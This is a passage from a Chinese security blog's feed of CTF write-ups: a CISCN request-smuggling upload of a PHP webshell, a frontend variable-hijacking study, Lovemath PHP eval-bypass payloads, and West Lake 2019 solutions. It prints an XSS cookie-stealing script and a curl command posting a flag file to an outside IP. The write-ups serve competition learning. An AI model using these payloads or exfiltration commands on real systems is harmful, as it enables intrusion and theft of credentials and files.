src="http://static.zybuluo.com/1160307775/omm1bo25ugdkr1lrz04ioy09/image_1dgv3e7u2gt16cr1et2e8lu553q.png" alt="image_1dgv3e7u2gt16cr1et2e8lu553q.png-38.9kB"></p><p>这里就涉及到知识盲区了，由于不会ida的动态调试，没有确定参数值，这里只能从writeup入手分析条件判断的含义。</p><p>官方payload:</p><pre><code>data=&#39;504f5354202f75706c6f61642e70687020485454502f312e310d0a486f73743a203132372e302e302e313a383038300d0a557365722d4167656e743a204d6f7a696c6c612f352e3020284d6163696e746f73683b20496e74656c204d6163204f5320582031302e31333b2072763a36362e3029204765636b6f2f32303130303130312046697265666f782f36362e300d0a4163636570743a20746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e380d0a4163636570742d4c616e67756167653a207a682c656e2d55533b713d302e372c656e3b713d302e330d0a526566657265723a20687474703a2f2f3132372e302e302e313a383038302f696e6465782e7068703f6163743d75706c6f61640d0a436f6e74656e742d547970653a206d756c7469706172742f666f726d2d646174613b20626f756e646172793d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d4c656e6774683a203234340d0a436f6e6e656374696f6e3a20636c6f73650d0a557067726164652d496e7365637572652d52657175657374733a20310d0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d226c6f676f75742e706870220d0a436f6e74656e742d547970653a20746578742f7068700d0a0d0a3c3f706870200d0a6576616c28245f524551554553545b615d293b0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739372d2d0d0a&#39;.replace(&#39;\n&#39;,&#39;&#39;)data=data.decode(&#39;hex&#39;)requests.post(url+&#39;/index.php&#39;,data={&#39;debug&#39;:&quot;sadfas HTTP/1.1\r\nHOST:localhost\r\nConnection:Keep-Alive\r\n\r\n%s\r\n&quot;%data},timeout=timeout)</code></pre><p>这样不难理解判断的核心即是否存在debug参数，并且对v16取了24位地址偏移后的值传入下一层函数，也就是之前要最终的形参path。</p><p>在payload中的形式，相当于传递了两个http包，拼接后如下</p><pre><code>POST whatever HTTP/1.1Host: localhostConnection: Keep-AlivePOST /upload.php HTTP/1.1Host: 127.0.0.1:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:66.0) Gecko/20100101 Firefox/66.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,en-US;q=0.7,en;q=0.3Referer: http://127.0.0.1:8080/index.php?act=uploadContent-Type: multipart/form-data; boundary=---------------------------6693638881479522630623693797Content-Length: 244Connection: closeUpgrade-Insecure-Requests: 1-----------------------------6693638881479522630623693797Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell&quot;Content-Type: text/php&lt;?php eval($_REQUEST[a]);-----------------------------6693638881479522630623693797--</code></pre><p>此时就可以把两个http包带入之前的path，构造一个完整的http包请求。而服务端在发送http请求时，会对请求包逐一发送。即先请求了<code>whatever</code>，建立http连接，connection:keep-alive 保持http的连接不被中断。</p><p>第二次请求data.decode(‘hex’)，让server帮我们请求Upload并上传md文件从而getshell</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>传了md就能解析php来getshell，只不过是要饶一个disable_function，预期解使用ld_preload去改变环境变量来bypass。不过有师傅提醒df过滤不全用popen也可以执行命令。</p><p>逆向功底太差了，有机会可以去抓个包分析一下debug参数的请求流程，最后膜出题师傅的知识渊博</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CISCN-2019-Final-Web11复盘&quot;&gt;&lt;a href=&quot;#CISCN-2019-Final-Web11复盘&quot; class=&quot;headerlink&quot; title=&quot;CISCN 2019 Final Web11复盘&quot;&gt;&lt;/a&gt;CISCN 2019 Fin
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>前端全局变量劫持</title>
    <link href="https://hpdoger.cn/2019/07/02/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/"/>
    <id>https://hpdoger.cn/2019/07/02/前端全局变量劫持/</id>
    <published>2019-07-01T16:00:00.000Z</published>
    <updated>2019-07-14T12:58:52.296Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前端全局变量劫持"><a href="#前端全局变量劫持" class="headerlink" title="前端全局变量劫持"></a>前端全局变量劫持</h1><p>最近看了wonderkun师傅的一篇文章，觉得还挺有意思的，收获颇丰。决定自己复现研究一下，原文地址：<a href="http://blog.wonderkun.cc/2019/07/01/前端中存在的变量劫持漏洞" target="_blank" rel="noopener">前端中存在的变量劫持漏洞</a></p><p>先说一下鸡肋的点，这个变量的劫持也只能是把变量劫持为正常页面的window对象，并不能随意修改变量的值</p><h1 id="子页面获取"><a href="#子页面获取" class="headerlink" title="子页面获取"></a>子页面获取</h1><p>首先kun师傅介绍了三种父页面获取子页面windows对象的方式:</p><pre><code>document.getElementById(&quot;iframe1&quot;).contentWindow;window.frames[0]; window[0] ;</code></pre><p>id值是一个全局变量，下例中test这个”id值”就代表iframe标签。也可以通过直接调用iframe内的name属性值获取该iframe的window对象<br><img src="http://static.zybuluo.com/1160307775/8n1kln6kltgkylriy0rutpd9/image_1df3psct91n0slcp85prp177u9.png" alt="image_1df3psct91n0slcp85prp177u9.png-60.3kB"></p><h1 id="利用filter模式删除变量"><a href="#利用filter模式删除变量" class="headerlink" title="利用filter模式删除变量"></a>利用filter模式删除变量</h1><p>无论是javascript还是调用标签，都无法覆盖已经定义的变量，但是却可以定义新的变量。</p><p>怎么让页面中出现未定义的全局变量呢？kun师傅提到chrome74之后，默认的xss auditor 从block模式编程了filter模式，可以利用这个删除掉页面中的代码。也就是说我们用一段xss代码触发chrome xss auditor删除xss引用的变量，从而达到替我们删除正常变量的目的。</p><p>这里简单介绍一下xss auditor</p><h2 id="XSS-Auditor"><a href="#XSS-Auditor" class="headerlink" title="XSS-Auditor"></a>XSS-Auditor</h2><p>XSS-Auditor是chrome默认开启的，也可以选择在header中关闭Auditor</p><pre><code>X-XSS-Protection: 0</code></pre><p>它的检测机制如文档中的描述<br><img src="http://static.zybuluo.com/1160307775/78neclm89yli79mwd4htps6z/image_1df3ue0v61s3a1dcr1spb1dmt12ia1g.png" alt="image_1df3ue0v61s3a1dcr1spb1dmt12ia1g.png-126.6kB"></p><p>XSS Auditor采用黑名单方法来识别请求参数中提供的危险字符和标签。它还将查询参数与内容进行匹配以识别注入点。如果查询参数无法与响应中的内容匹配，则不会触发Auditor。</p><p>不过文档也有提到，基于上下文的检测的局限性使Auditor无法预防一些针对应用层的payload，这里不做深究。</p><h2 id="删除变量demo"><a href="#删除变量demo" class="headerlink" title="删除变量demo"></a>删除变量demo</h2><pre><code>&lt;script&gt;var hpdoger = &quot;remove me&quot;;&lt;/script&gt;</code></pre><p>当访问的参数以危险标签的形式出现在response中时，就会触发xss-auditor，成功删除自定义的hpdoger变量。下图可以看到变量被成功删除</p><pre><code>http://localhost/iframe.html?xss=%3Cscript%3E%0A%20%20%20%20%20var%20hpdoger%20=%20%22remove%22;%0A%3C/script%3E</code></pre><p><img src="http://static.zybuluo.com/1160307775/c70k199x2qygcxi7z7nmf9fg/image_1df3uoatdojsl0fksa1e3b1nb21t.png" alt="image_1df3uoatdojsl0fksa1e3b1nb21t.png-112.7kB"></p><h1 id="bypass同源之iframe"><a href="#bypass同源之iframe" class="headerlink" title="bypass同源之iframe"></a>bypass同源之iframe</h1><p>众所周知，用iframe去加载子页面会被同源限制(除非是cors配置的白名单)<br><img src="http://static.zybuluo.com/1160307775/98cjog73vc1fxs6fuei5nypt/image_1df3vq1ivipk1qo3a383ao1lnd2n.png" alt="image_1df3vq1ivipk1qo3a383ao1lnd2n.png-93.8kB"></p><p><strong>如果儿子页面也存在iframe</strong>(划重点)，先通过操纵孙子c页面window对象来设置location，使其指向父页面a，这样父页面a和子页面b就同源了。之后再修改孙子页面c中window对象的name，其作用结果是：name作用域在子页面b的全局变量。</p><h1 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h1><p>这里不重复造轮子了，引用kun师傅的文章：<a href="https://xz.aliyun.com/t/5565#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/5565#toc-4</a></p><h2 id="孙子页面c"><a href="#孙子页面c" class="headerlink" title="孙子页面c"></a>孙子页面c</h2><p>任意的页面</p><h2 id="子页面b"><a href="#子页面b" class="headerlink" title="子页面b"></a>子页面b</h2><p><img src="http://static.zybuluo.com/1160307775/mz1lfmzmxftl49tvbpeh5lxn/image_1df5h2g811eg76b3bdo1v0b18dqm.png" alt="image_1df5h2g811eg76b3bdo1v0b18dqm.png-53.8kB"></p><h2 id="父页面a"><a href="#父页面a" class="headerlink" title="父页面a"></a>父页面a</h2><p>第一步很关键的一点就是修改c页面的location指向a。之后a页面就可以调用b的变量，同时通过iframe触发b页面的xss auditor<br><img src="http://static.zybuluo.com/1160307775/86zy0vdrthffjgmulc9qqu9c/image_1df5grfcl16f71ejc1j5upqr10re9.png" alt="image_1df5grfcl16f71ejc1j5upqr10re9.png-127.5kB"></p><p>第二步修改孙子页面c的name，从而帮b页面注册一个全局变量名为”hpdoger”<br><img src="http://static.zybuluo.com/1160307775/4qeb5di2v560f26o9jdr9804/image_1df5h8abti9j1bptl671to1e3213.png" alt="image_1df5h8abti9j1bptl671to1e3213.png-72.1kB"></p><p>这样就成功替换掉b页面的hpdoger变量，同时a页面也可以访问b页面这个全局变量hpdoger(但是不能访问b的其他变量。因为我们通过c页面做跳板，只能访问c的属性间接访问到b的变量，我叫他”同名法则”)。不过前文也提到了这个鸡肋的地方，就是一个变量替换成window对象，受用面很有限。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前端全局变量劫持&quot;&gt;&lt;a href=&quot;#前端全局变量劫持&quot; class=&quot;headerlink&quot; title=&quot;前端全局变量劫持&quot;&gt;&lt;/a&gt;前端全局变量劫持&lt;/h1&gt;&lt;p&gt;最近看了wonderkun师傅的一篇文章，觉得还挺有意思的，收获颇丰。决定自己复现研究一下，
      
    
    </summary>
    
    
      <category term="XSS测试" scheme="https://hpdoger.cn/tags/XSS%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>2019国赛Web线上题目Lovemath多解WP</title>
    <link href="https://hpdoger.cn/2019/04/23/2019%E5%9B%BD%E8%B5%9BWeb%E7%BA%BF%E4%B8%8A%E9%A2%98%E7%9B%AELovemath%E5%A4%9A%E8%A7%A3WP/"/>
    <id>https://hpdoger.cn/2019/04/23/2019国赛Web线上题目Lovemath多解WP/</id>
    <published>2019-04-22T16:00:00.000Z</published>
    <updated>2019-07-12T10:03:27.296Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2019国赛Web线上题目Lovemath多解WP"><a href="#2019国赛Web线上题目Lovemath多解WP" class="headerlink" title="2019国赛Web线上题目Lovemath多解WP"></a>2019国赛Web线上题目Lovemath多解WP</h1><p>题目质量很不错，这题整整做了七个小时，从一开始想着拿一血到后来的自闭。</p><h1 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h1><pre><code class="php">&lt;?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET[&#39;c&#39;])){     show_source(__FILE__); }else{     //例子 c=20-1     $content = $_GET[&#39;c&#39;];     if (strlen($content) &gt;= 80) {         die(&quot;太长了不会算&quot;);     }     $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];     foreach ($blacklist as $blackitem) {         if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) {             die(&quot;请不要输入奇奇怪怪的字符&quot;);         }     }     //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp     $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);     foreach ($used_funcs[0] as $func) {         if (!in_array($func, $whitelist)) {             die(&quot;请不要输入奇奇怪怪的函数&quot;);         }     }     //帮你算出答案     eval(&#39;echo &#39;.$content.&#39;;&#39;); }</code></pre><h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>代码有一个黑名单blacklist&amp;白名单whitelist。黑名单肯定是绕不过去，虽然正则给了/m模式的情况下可以采用换行绕过，但是\r也在封杀范围所以直接pass。注意看whitelist后面的逻辑：正则匹配所有字母，用foreach逐个比对匹配的字母。<br><img src="http://static.zybuluo.com/1160307775/rd7dioxl1v60noellw9opm0m/image_1d94aluchp6k1a607ht1ml2132q9.png" alt="image_1d94aluchp6k1a607ht1ml2132q9.png-224.4kB"></p><p>也就是说只允许Eval使用白名单的函数做字符串</p><p>所以思路就很明确，既然参数从白名单出来后被执行，那漏洞点肯定就在白名单的函数。由于正则匹配字母的规则，使我们传入的实参不能是字母，否则就会进入判断如下<br><img src="http://static.zybuluo.com/1160307775/73g78cw6hxwdepx0wny3oloy/image_1d9419hr91e511p621k4l177k1a5726.png" alt="image_1d9419hr91e511p621k4l177k1a5726.png-31.6kB"></p><p>想办法把数字变成字母，再通过eval进行RCE。着眼于函数base_convert，官方描述如下<br><img src="http://static.zybuluo.com/1160307775/u1tsyajx6w5bpj9o8bksaa6e/image_1d94aoodi184tdml1udl7q91b0gm.png" alt="image_1d94aoodi184tdml1udl7q91b0gm.png-126.9kB"></p><p>它允许我们将10进制数转换为最高36进制，结果为字符串。完美解决了数字到字母的转化，成功打印phpinfo如下<br><img src="http://static.zybuluo.com/1160307775/6otny6nfb85kfltkdhoutv2b/image_1d94ard4e1orte5mo6a1oj6hjj1j.png" alt="image_1d94ard4e1orte5mo6a1oj6hjj1j.png-396.7kB"></p><h1 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h1><p>因为字符串长度限制，我最开始的想法是这样的：</p><pre><code>$input = hexdec(bin2hex(&quot;system(&#39;cat /flag&#39;);&quot;))$result = base_convert(10进制编码字符串hex2bin,10,36)(dechex($input))</code></pre><p>完整转换是这样：</p><pre><code>base_convert(37907361743,10,36)(dechex(9148825951463535960001056079872))</code></pre><p>但是由于bin2hex后转换出来的16进制数值过大，导致hexdec转换的int值很大无法正常被dechex还原而溢出。在赛后看到一种payload，很聪明的避免了大数溢出的情况，如下</p><pre><code>base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260465194)))</code></pre><p><img src="http://static.zybuluo.com/1160307775/xtgdey8iv615ywg0w55fxfay/image_1d941nbdm171k17a3lhg16ii1knh3q.png" alt="image_1d941nbdm171k17a3lhg16ii1knh3q.png-24.3kB"></p><p>正好79个字母堪称完美…解码后的调用栈如下<br><img src="http://static.zybuluo.com/1160307775/u3la0kpp7bgngowxzez2nx21/image_1d941l8bp14ag1cq1eil1hi57ti3d.png" alt="47138-&gt;exec"></p><h1 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h1><p>这个是看到ROIS队伍师傅的poc</p><pre><code>$pi=base_convert;$pi(371235972282,10,28)(($pi(8768397090111664438,10,30))(){9})</code></pre><p>解码出来是<code>system(getallheaders(){9})</code></p><p>也是很聪明的解法。变量赋值pi减少长度，用getallheaders动态传入参数，之前在code puzzle中见过这样的用法</p><h1 id="POC-3"><a href="#POC-3" class="headerlink" title="POC-3"></a>POC-3</h1><p>这种就是比赛时我的解法。一种小数还原的思路。我们只需要构造_GET为16进制数，这个16进制转换出来的十进制就不会很大，自然在dechex也不会溢出。Payload如下，注意用白名单的值作为变量参数，否则还是会被waf</p><pre><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){0}(($$p){1})</code></pre><p>转换的调用栈如下：<br><img src="http://static.zybuluo.com/1160307775/pwdw95ivta0rswwvhukw4mk0/image_1d94271vhpqtbtv1mk1v7upa047.png" alt="image_1d94271vhpqtbtv1mk1v7upa047.png-32.8kB"></p><p>直接发包给到C参数，成功getflag。<br><img src="http://static.zybuluo.com/1160307775/kbdgi0lo22k9ho6p51u4c325/image_1d9427hgv862p0f8bluecra94k.png" alt="image_1d9427hgv862p0f8bluecra94k.png-83.5kB"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2019国赛Web线上题目Lovemath多解WP&quot;&gt;&lt;a href=&quot;#2019国赛Web线上题目Lovemath多解WP&quot; class=&quot;headerlink&quot; title=&quot;2019国赛Web线上题目Lovemath多解WP&quot;&gt;&lt;/a&gt;2019国赛Web线上
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑2019-Writeup</title>
    <link href="https://hpdoger.cn/2019/04/08/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912019-Writeup/"/>
    <id>https://hpdoger.cn/2019/04/08/西湖论剑2019-Writeup/</id>
    <published>2019-04-07T16:00:00.000Z</published>
    <updated>2019-04-09T08:33:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="西湖论剑2019-Writeup"><a href="#西湖论剑2019-Writeup" class="headerlink" title="西湖论剑2019-Writeup"></a>西湖论剑2019-Writeup</h1><p>Author:Hpdoger@D0g3</p><p>这次比赛的Web题顺序放的很有意思。先放web3、再web2、接着web1来了个bug题被秒。ak了三个web之后本来都出去买奶茶喝了，结果比赛末尾有师傅说上了个web4…好在最后零解23333</p><h1 id="Web-3"><a href="#Web-3" class="headerlink" title="Web-3"></a>Web-3</h1><p>扫描到DS_Store文件泄露：<a href="http://ctf3.linkedbyx.com/11182/DS_Store" target="_blank" rel="noopener">http://ctf3.linkedbyx.com/11182/DS_Store</a><br><img src="http://static.zybuluo.com/1160307775/y7a0rdxx52eav7p0rn96oikc/image_1d7rcmc741ep8qtr17um15g5v49.png" alt="image_1d7rcmc741ep8qtr17um15g5v49.png-31.9kB"></p><p>扫描了一下e1xxx这个自路径发现一处git泄露：<br><img src="http://static.zybuluo.com/1160307775/4utptwr6qxtydxzsxhry0pvr/image_1d7rcont5k191lp1131q17k81eri4m.png" alt="image_1d7rcont5k191lp1131q17k81eri4m.png-38.3kB"></p><p>访问到github仓库:<a href="https://github.com/cumtxujiabin/zip" target="_blank" rel="noopener">https://github.com/cumtxujiabin/zip</a><br><img src="http://static.zybuluo.com/1160307775/ucxu7j63r39crwi3tci5vl0x/image_1d7rcp5i018i0sesg9a1oec9g353.png" alt="image_1d7rcp5i018i0sesg9a1oec9g353.png-78.6kB"></p><p>源码git clone下来看，发现Backup这个zip包需要密码，但是同文件夹下有Index.php和jpg被解压出来了。猜测是已知明文攻击<br><img src="http://static.zybuluo.com/1160307775/vhc6g73jwf6obx3j6edutvqy/image_1d7rcsqca1qcl1538t7j1mpti6f60.png" alt="image_1d7rcsqca1qcl1538t7j1mpti6f60.png-37.5kB"></p><p>用AR跑了一下得到hint文件<br><img src="http://static.zybuluo.com/1160307775/kw4offpg4avzpe0ccs5ji599/image_1d7s0v7dd1djv10opn7j11jq113cei.png" alt="image_1d7s0v7dd1djv10opn7j11jq113cei.png-72.4kB"></p><p>点开hint有两个提示，</p><ol><li>很明显这个code就是之前首页的参数值<br><img src="http://static.zybuluo.com/1160307775/qr951e5gxpg4860aulbxpnvj/image_1d7riioviv8dnt21j3g1m6s1l9j6q.png" alt="image_1d7riioviv8dnt21j3g1m6s1l9j6q.png-14.9kB"></li><li>seed应该暗示着随机数/种子</li></ol><p>拿着Code请求得到一个数，结合hint猜测是要用兑换码爆破随机数种子<br><img src="http://static.zybuluo.com/1160307775/lfy0x9hxu4icygym0gkvnrx5/image_1d7rilc951g6t1idm1qtg1osbjnv77.png" alt="image_1d7rilc951g6t1idm1qtg1osbjnv77.png-61.2kB"></p><p>最后跑出来种子+.txt后缀请求得到flag<br><img src="http://static.zybuluo.com/1160307775/a6w2254ge2kgzj3ltc4t7gau/image_1d7rkjigs14vl1gg9h801mr18onag.png" alt="image_1d7rkjigs14vl1gg9h801mr18onag.png-40kB"><br><img src="http://static.zybuluo.com/1160307775/sj0b5o6mrowzi3y4jl0ce6cn/image_1d7rkfg2e1enjh0g1kif2lb14ala3.png" alt="image_1d7rkfg2e1enjh0g1kif2lb14ala3.png-23.2kB"></p><p>略脑洞。。</p><h1 id="Web-2"><a href="#Web-2" class="headerlink" title="Web-2"></a>Web-2</h1><p>题目环境关了有些无法截图</p><p>随便输入账号都能登陆，有留言功能、提交给管理员url的功能和EXEC页面，EXEC我推测是个命令执行但是需要管理员权限，所以应该是XSS-&gt;admin-&gt;rce。留言位置可以插入标签iframe\img\svg.. 但是过滤掉了等号，会被转译成:)，我测试的时候用iframe以base64编码属性就能绕过</p><pre><code>&lt;iframe/src=&quot;data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==</code></pre><p>编码内容即<code>&lt;img src=x onerror=alert(1)&gt;</code>，可以弹出对话框，</p><p>看到了提交Url处有这么一句话，大致好像是这么说的：管理员会拿着你的token来请求页面，之前还在想管理员怎么请求到我的main(因为我测试可以缓存js文件，可能也是一个方面)，但是看到这里就完全不用担心了，直接X一个储值型的标签打COOKIE</p><p>但是测试用js uri加载外源js不能成功，打不到cookie。</p><p>那么我们可不可以直接src下调用Javascript伪协议执行一段js发送COOKIE到平台呢？用ascii编码html字符去bypass</p><p>编码转换+exp如下<br><img src="http://static.zybuluo.com/1160307775/b5tqrpd78fjkvlld0e7sxvy9/image_1d7rltv912q91kmukju81714bjbn.png" alt="image_1d7rllved1r0b1ku31lp717bi3hdat.png-71.2kB"></p><p>url编码处理一下&amp;、#字符<br><img src="http://static.zybuluo.com/1160307775/amfts3uhddl0jr31udpj9qpa/image_1d7rloelagnr1aib1g56184q16cpba.png" alt="image_1d7rloelagnr1aib1g56184q16cpba.png-153kB"></p><p>在平台打到cookie，发现存在admin字段<br><img src="http://static.zybuluo.com/1160307775/e3jfk48x3gtv1b2sv72x2rkh/image_1d7rlvepfab61co61oj45l6nctc4.png" alt="image_1d7rlvepfab61co61oj45l6nctc4.png-36.5kB"></p><p>带着admin字段去exec.php执行命令就行了<br><img src="http://static.zybuluo.com/1160307775/ucowwhqx8njayw5q0mdhm8rm/image_1d7rm2jhs1ijc1t2898epplgch.png" alt="image_1d7rm2jhs1ijc1t2898epplgch.png-70.5kB"></p><pre><code>curl+&#39;http://50.16.48.95/&#39;+--data+&quot;`cat+/flag.txt`&quot;</code></pre><p><img src="http://static.zybuluo.com/1160307775/lpus3euv91f6ktmyow8un530/image_1d7rm3mr9ffe1d2gqr93lp1obcu.png" alt="image_1d7rm3mr9ffe1d2gqr93lp1obcu.png-57kB"></p><p>编码转换的exp如下</p><pre><code># Author:Hpdoger@d0g3html_old = &quot;javascript:var website=&#39;http://xssye/index.php&#39;;(function(){(new Image()).src=website+&#39;/?keepsession=1&amp;location=&#39;+escape((function(){try{return document.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;toplocation=&#39;+escape((function(){try{return top.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;cookie=&#39;+escape((function(){try{return document.cookie}catch(e){return&#39;&#39;}})())+&#39;&amp;opener=&#39;+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#39;&#39;}catch(e){return&#39;&#39;}})());})();&quot;buffer = &quot;&quot;for zimu in html_old:    zimu = ord(zimu)    zimu = &quot;&amp;#&quot;+(&quot;%07d&quot;) % (zimu)    # print(&quot;&amp;#&quot;+zimu)    buffer = buffer + zimuprint(buffer)</code></pre><h1 id="web-1"><a href="#web-1" class="headerlink" title="web-1"></a>web-1</h1><p>这题上来就有个提示$_GET[‘file’]，打了下etc/passwd有内容</p><p>看到有个提示，base64解码之后是，dir.php<br><img src="http://static.zybuluo.com/1160307775/sn4yzp6jhu22951ixfda9wz9/image_1d7rmb67sieflmcrj41nmodcsdb.png" alt="image_1d7rmb67sieflmcrj41nmodcsdb.png-66.1kB"></p><p>请求dir.php，同时fuzz参数，有个dir(其实略脑洞，我只尝试了file、dir、path就出来了。。<br><img src="http://static.zybuluo.com/1160307775/dqvga0mdv6ohks1ymtth4rbe/image_1d7rmfl1j1rab1ind11sb1ffr1bshdo.png" alt="image_1d7rmfl1j1rab1ind11sb1ffr1bshdo.png-212.3kB"></p><p>看到根目录存在ffxxx的文件，直接用file去读<br><img src="http://static.zybuluo.com/1160307775/8qtcm0dqetiop2w9ccw2tr8k/image_1d7rmhg0ls1l3ptm8k29n614e5.png" alt="image_1d7rmhg0ls1l3ptm8k29n614e5.png-27.7kB"></p><h1 id="MISC3-TTL隐写"><a href="#MISC3-TTL隐写" class="headerlink" title="MISC3 TTL隐写"></a>MISC3 TTL隐写</h1><p>给了个本文，里面是很多TTL值。hint说隐藏了信息。<br><img src="http://static.zybuluo.com/1160307775/m9tv96888aiofm7wv51e4bp3/image_1d7ttpfr51j1m1jks1rd3bafkqjp.png" alt="image_1d7ttpfr51j1m1jks1rd3bafkqjp.png-31.8kB"></p><p>在网上找了一下，发现在MISC中有一项技术叫TTL隐写。</p><p>大致的隐写流程如下：<br>将TTL的值转为8位二进制，高位补0，取头两位的二进制。这样4个TTL的值就能取够一个8位的二进制数，再将这个8位的二进制转换为字符(因为一个字符=一个字节=8位二进制)。</p><p>这就是成功将字符隐写在TTL值中，所以只需要逆出来取8位还原成字符就行，写了个提取脚本</p><pre><code>#! /usr/bin/python3# Author: Hpdoger@d0g3count = 0change_list = []word_list = &#39;&#39;zimus = &#39;&#39;with open(&quot;ttls.txt&quot;,&quot;r&quot;) as file:    for ttl in file.readlines():        change_list.append(ttl.replace(&#39;TTL=&#39;,&#39;&#39;))        if len(change_list) == 4:            for num in change_list:                num = int(num)                a = bin(num).replace(&#39;0b&#39;,&#39;&#39;)                b = str(&quot;%08d&quot; % int(a))                infront = b[0:2]                word_list = word_list + infront            zimu = int(word_list,2)            zimus = zimus+chr(zimu)            word_list = &#39;&#39;            change_list.clear()            count = 0with open(&#39;results.txt&#39;,&#39;w&#39;) as file2:    file2.write(zimus)</code></pre><p>转换出来的结果如下<br><img src="http://static.zybuluo.com/1160307775/0ulidat6fp1h55b84nrtusak/image_1d7tu4dn0ncj1f5s1o7j15641ggr19.png" alt="image_1d7tu4dn0ncj1f5s1o7j15641ggr19.png-147.1kB"></p><p>一看就是16进制，开头ffd8ff是图片头，拖到winhex里还原成图片就行了，最后还原出来4个二维码。</p><p>拼接扫描得到:</p><pre><code>key:AutomaticKey cipher:fftu{2028mb39927wn1f96o6e12z03j58002p}</code></pre><p>维吉尼亚密码解密，得到<br>flag{2028ab39927df1d96e6a12b03j58002v}<br>再进行一次字母转换<br>e-&gt;j,e-&gt;v<br>flag{2028ab39927df1d96e6a12b03e58002e}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;西湖论剑2019-Writeup&quot;&gt;&lt;a href=&quot;#西湖论剑2019-Writeup&quot; class=&quot;headerlink&quot; title=&quot;西湖论剑2019-Writeup&quot;&gt;&lt;/a&gt;西湖论剑2019-Writeup&lt;/h1&gt;&lt;p&gt;Author:Hpdoger
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>SRC挖掘初探之随缘XSS挖掘</title>
    <link href="https://hpdoger.cn/2019/04/05/SRC%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2%E4%B9%8B%E9%9A%8F%E7%BC%98XSS%E6%8C%96%E6%8E%98/"/>
    <id>https://hpdoger.cn/2019/04/05/SRC挖掘初探之随缘XSS挖掘/</id>
    <published>2019-04-04T16:00:00.000Z</published>
    <updated>2019-04-05T10:07:54.000Z</updated>
    
